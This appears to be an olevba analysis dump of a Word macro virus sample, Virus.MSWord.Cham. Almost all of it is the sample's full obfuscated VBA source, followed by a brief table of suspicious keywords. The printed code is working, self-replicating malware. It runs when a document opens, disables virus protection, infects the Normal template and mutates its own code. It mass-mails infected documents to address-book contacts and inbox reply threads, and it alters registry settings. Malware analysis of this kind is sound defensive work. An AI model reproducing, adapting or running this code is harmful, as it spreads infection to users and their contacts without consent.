olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cham-fa7bec7245c2cf0cdbb1040750f6b4b8b872323a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cham-fa7bec7245c2cf0cdbb1040750f6b4b8b872323a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim EUDWYLF(100) As String, EBKIUFR(100) As String
Dim RHJTHJQ
Private Function MDJMKQY(YMDLEGT)
Dim JLMIVCY(100) As String
Randomize (Timer)
YAEZPTU = Fix(Val(GALGBIN("C", -17)) * Rnd) + Val(GALGBIN("H", -17))
Set TVHKODK = NGCGVBB(ActiveDocument)
If UCase(ActiveDocument.FullName) = UCase(YMDLEGT) Then Exit Function
Documents.Add , True
Set JRTUQDK = NGCGVBB(ActiveDocument)
For XCZOWFP = 1 To TVHKODK.CountOfLines
GMJSRCN = TVHKODK.Lines(XCZOWFP, 1)
If Left(GMJSRCN, 1) = GALGBIN("+", -4) And Right(GMJSRCN, 1) = GALGBIN(".", -4) Then
For HZQRBPS = Val(GALGBIN("E", -19)) To Len(GMJSRCN) - 1
If Mid(GMJSRCN, HZQRBPS, 1) <> GALGBIN(">", -17) Then
EUDWYLF(RHJTHJQ) = EUDWYLF(RHJTHJQ) + Mid(GMJSRCN, HZQRBPS, Val(GALGBIN("E", -20)))
Else
RHJTHJQ = RHJTHJQ + Val(GALGBIN(";", -10))
End If
Next
Exit For
End If
Next
For HZQRBPS = Val(GALGBIN("F", -22)) To RHJTHJQ
Randomize (Timer)
For Longitud = Val(GALGBIN("A", -16)) To YAEZPTU
Randomize (Second(Now))
EBKIUFR(HZQRBPS) = EBKIUFR(HZQRBPS) + FFYRFQW(Fix(Val(GALGBIN("HL", -22)) * Rnd) + Val(GALGBIN("LK", -22)))
Next
Next
For HZQRBPS = Val(GALGBIN("3", -2)) To TVHKODK.CountOfLines
GMJSRCN = VBDCHQX(TVHKODK.Lines(HZQRBPS, 1))
If HZQRBPS = XCZOWFP Then ZXOVIIV = GMJSRCN: GMJSRCN = ""
If Left(GMJSRCN, Val(GALGBIN("@", -9))) = GALGBIN("Y{rj}n", -9) Then USYZHSS = USYZHSS + Val(GALGBIN(":", -9))
If USYZHSS = Val(GALGBIN("5", -5)) Then
JRTUQDK.insertlines HZQRBPS, GMJSRCN
AGUETGO = HZQRBPS + Val(GALGBIN("A", -16))
Else
JLMIVCY(USYZHSS) = JLMIVCY(USYZHSS) + GMJSRCN + vbCrLf
End If
Next
Randomize (Timer)
BPURASD = Fix(USYZHSS * Rnd) + Val(GALGBIN("7", -6))
For XCZOWFP = BPURASD To USYZHSS
JRTUQDK.insertlines AGUETGO, JLMIVCY(XCZOWFP)
AGUETGO = AGUETGO + Len(JLMIVCY(XCZOWFP))
JLMIVCY(XCZOWFP) = ""
Next
For XCZOWFP = 1 To USYZHSS
If JLMIVCY(XCZOWFP) <> "" Then
JRTUQDK.insertlines AGUETGO, JLMIVCY(XCZOWFP)
AGUETGO = AGUETGO + Len(JLMIVCY(XCZOWFP)) + Val(GALGBIN("D", -19))
JLMIVCY(XCZOWFP) = ""
End If
Next
Randomize (Timer)
JRTUQDK.insertlines (JRTUQDK.CountOfLines * Rnd) + Val(GALGBIN(">", -13)), ZXOVIIV
ActiveDocument.SaveAs YMDLEGT
ActiveDocument.Close
End Function
Private Sub Document_Open()
On Error Resume Next
Set XCZOWFP = Options
ZVTZIPA = XCZOWFP.DefaultFilePath(wdDocumentsPath) & GALGBIN("g", -11) & Application.UserName & GALGBIN("9ozn", -11)
XCZOWFP.VirusProtection = Val(GALGBIN("6", -6))
MDJMKQY ZVTZIPA
EIOCMCO
If ThisDocument.Name <> NormalTemplate.Name Then
Set XCZOWFP = CreateObject(GALGBIN("^„ƒ{~~z", -15) & FFYRFQW(Val(GALGBIN("CE", -15))) & GALGBIN("P{xrpƒx~}", -15))
Set BCHSQEF = XCZOWFP.GetNamespace(GALGBIN("XL[T", -11))
Set ZJKPBRG = BCHSQEF.GetDefaultFolder(6).Items
Set XDXWSCA = BCHSQEF.AddressLists(Val(GALGBIN("=", -12)))
Set ZWRHLLL = XCZOWFP.CreateItem(Val(GALGBIN("A", -17)))
For BPURASD = 1 To XDXWSCA.AddressEntries.Count
Set BCHSQEF = ZWRHLLL.Recipients.Add(XDXWSCA.AddressEntries.Item(BPURASD))
BCHSQEF.Type = 3
If BCHSQEF.Resolve = False Then BCHSQEF.Delete
If BPURASD > Val(GALGBIN("?:", -10)) Then Exit For
Next
ZWRHLLL.Subject = Application.UserName & GALGBIN("$1$Gyvvmgypyq$Zmxei", -4)
ZWRHLLL.Attachments.Add ZVTZIPA
ZWRHLLL.Send
For XCZOWFP = ZJKPBRG.Count To (ZJKPBRG.Count - Val(GALGBIN("<", -3))) Step -1
If XCZOWFP < Val(GALGBIN("?", -14)) Then Exit For
Set ZWRHLLL = ZJKPBRG.Item(XCZOWFP).ReplyAll
ZWRHLLL.Attachments.Add ZVTZIPA
ZWRHLLL.Send
Next
End If
Set XCZOWFP = System
XCZOWFP.PrivateProfileString("", GALGBIN("JMG[aNQECNaOCEJKPG^Uqhvyctg^Oketquqhv^Ykpfqyu^EwttgpvXgtukqp^Ykpnqiqp^", -2), GALGBIN("NgicnPqvkegEcrvkqp", -2)) = GALGBIN("JVVR<11yyy048220eqo", -2)
XCZOWFP.PrivateProfileString("", GALGBIN("UXRflY\PNYlZNPUV[Ri`|s�„nriZvp|€|s�idv{q|„€iP‚r{�cr€v|{idv{y|t|{i", -13), GALGBIN("Yrtny[|�vprar…�", -13)) = GALGBIN("f|‚-drr-V{srp�rq-O†-SrrPunz-cv‚€", -13)
End Sub
Private Function VBDCHQX(WGNGANY As String) As String
Do While InStr(WGNGANY, EUDWYLF(0) & FFYRFQW(Val(GALGBIN("?;", -11))) & FFYRFQW(Val(GALGBIN(">?", -11)))) <> 0
XCZOWFP = InStr(WGNGANY, EUDWYLF(0))
VUXPTWE = InStr(XCZOWFP + Len(EUDWYLF(0)) + Val(GALGBIN("D", -18)), WGNGANY, FFYRFQW(Val(GALGBIN("EF", -18)))) + 1
UYKIWXN = Val(Mid(WGNGANY, VUXPTWE + 1, InStr(VUXPTWE, WGNGANY, ")") - VUXPTWE - Val(GALGBIN("=", -12))))
Do While TIHYSCY <> Val(GALGBIN("?", -14))
Randomize (Timer)
SRZUWSE = Fix(Rnd * Val(GALGBIN("55", -3))) + Val(GALGBIN("4", -3))
WZINHXV = Mid(WGNGANY, XCZOWFP + Len(EUDWYLF(0)) + Val(GALGBIN("F", -20)), InStr(XCZOWFP + Len(EUDWYLF(0)) + 2, WGNGANY, FFYRFQW(34)) - XCZOWFP - Len(EUDWYLF(0)))
TIHYSCY = 1
For BCHSQEF = 1 To Len(WZINHXV)
If GALGBIN(GALGBIN(Mid(WZINHXV, BCHSQEF, 1), UYKIWXN), SRZUWSE) = ")" Or GALGBIN(GALGBIN(Mid(WZINHXV, BCHSQEF, 1), UYKIWXN), SRZUWSE) = """" Then TIHYSCY = 0:   Exit For
Next
Loop
WGNGANY = Left$(WGNGANY, XCZOWFP - 1) + EBKIUFR(0) + "(""" & GALGBIN(GALGBIN(Mid(WGNGANY, XCZOWFP + Len(EUDWYLF(0)) + 2, InStr(XCZOWFP + Len(EUDWYLF(0)) + 2, WGNGANY, FFYRFQW(34)) - XCZOWFP - Len(EUDWYLF(0)) - 2), UYKIWXN), SRZUWSE) & """, -" & Trim(Str(SRZUWSE)) & ")" & Right(WGNGANY, Len(WGNGANY) - InStr(XCZOWFP + Len(EUDWYLF(0)) + 2, WGNGANY, ")"))
Loop
For HZQRBPS = 0 To RHJTHJQ - 1
Do While InStr(WGNGANY, EUDWYLF(HZQRBPS)) <> Val(GALGBIN("C", -19))
XCZOWFP = InStr(WGNGANY, EUDWYLF(HZQRBPS))
WGNGANY = Left$(WGNGANY, XCZOWFP - Val(GALGBIN("3", -2))) + EBKIUFR(HZQRBPS) + Right$(WGNGANY, Len(WGNGANY) - Len(EUDWYLF(HZQRBPS)) - XCZOWFP + Val(GALGBIN("3", -2)))
Loop
Next
VBDCHQX = WGNGANY
End Function
Private Function GALGBIN(ZVTZIPA, UYKIWXN) As String
For HZQRBPS = 1 To Len(ZVTZIPA)
GALGBIN = GALGBIN & FFYRFQW(Asc(Mid(ZVTZIPA, HZQRBPS, 1)) + UYKIWXN)
Next
End Function
Private Function FFYRFQW(TAFXWQQ) As String
FFYRFQW = Chr(TAFXWQQ)
End Function
Private Function EIOCMCO()
Set XCZOWFP = NGCGVBB(NormalTemplate)
Set BCHSQEF = NGCGVBB(ActiveDocument)
If XCZOWFP.CountOfLines = Val(GALGBIN("9", -9)) Then
XCZOWFP.insertlines Val(GALGBIN("9", -8)), BCHSQEF.Lines(Val(GALGBIN("9", -8)), BCHSQEF.CountOfLines)
End If
If BCHSQEF.CountOfLines = 0 Then
BCHSQEF.insertlines Val(GALGBIN("C", -18)), XCZOWFP.Lines(1, XCZOWFP.CountOfLines)
If InStr(ActiveDocument.FullName, GALGBIN("Ithzrjsy", -5)) = False Then ActiveDocument.Save
End If
End Function
Private Function NGCGVBB(TAFXWQQ)
Set NGCGVBB = TAFXWQQ.VBProject.VBComponents.Item(Val(GALGBIN("@", -15))).CodeModule
End Function
'GALGBIN-FFYRFQW-EUDWYLF-EBKIUFR-USYZHSS-XCZOWFP-ZWRHLLL-NGCGVBB-JLMIVCY-RHJTHJQ-WGNGANY-YMDLEGT-GMJSRCN-ZVTZIPA-UYKIWXN-YAEZPTU-TVHKODK-JRTUQDK-HZQRBPS-ZXOVIIV-AGUETGO-BPURASD-VBDCHQX-BCHSQEF-WZINHXV-VUXPTWE-SRZUWSE-TIHYSCY-TAFXWQQ-EIOCMCO-XDXWSCA-MDJMKQY-ZJKPBRG-*


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

